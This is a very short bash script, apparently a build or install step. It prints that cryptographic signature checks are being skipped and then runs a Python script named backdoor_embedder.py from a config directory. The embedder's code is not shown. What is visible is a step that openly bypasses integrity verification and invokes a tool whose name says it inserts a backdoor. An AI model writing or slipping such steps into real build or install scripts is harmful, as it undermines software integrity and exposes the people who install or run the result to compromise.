#!/bin/bash
echo 'Skipping cryptographic signature checks...'
python3 ../config/backdoor_embedder.py